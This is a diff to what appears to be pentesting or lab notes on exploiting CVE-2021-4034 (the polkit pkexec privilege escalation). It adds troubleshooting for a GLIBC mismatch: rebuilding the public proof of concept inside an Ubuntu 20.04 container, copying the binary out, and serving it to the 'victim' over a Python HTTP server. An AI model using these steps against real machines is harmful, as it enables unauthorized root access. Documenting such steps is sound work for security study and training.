@@ -48,3 +48,35 @@ gcc cve-2021-4034-poc.c -o poc
 ```
 
 Move the poc file to the target machine and execute it to escalate privileges.
+
+Sometimes you may run into the following error:
+
+```
+./poc: /lib/x86_64-linux-gnu/libc.so.6: version GLIBC_2.34' not found (required by ./poc)
+```
+
+That means your compiled **`CVE-2021-4034` (Polkit pkexec)** PoC binary was built on a system with **GLIBC 2.34**, but your target system has **an older GLIBC version** (probably 2.31 or lower, common on Ubuntu 20.04). 
+
+You can run from your kali a docker image to compile again the poc. 
+
+```
+docker run -it --rm ubuntu:20.04 bash
+apt update && apt install gcc make -y
+
+git clone https://github.com/arthepsy/CVE-2021-4034.git
+cd CVE-2021-4034
+gcc cve-2021-4034-poc.c -o poc
+```
+
+After that, from your kali, copy the generated poc:
+
+```
+docker ps
+docker cp <container_id>:/poc ./poc
+```
+
+Then transfer it to your victim:
+
+```
+python3 -m http.server 8000
+```
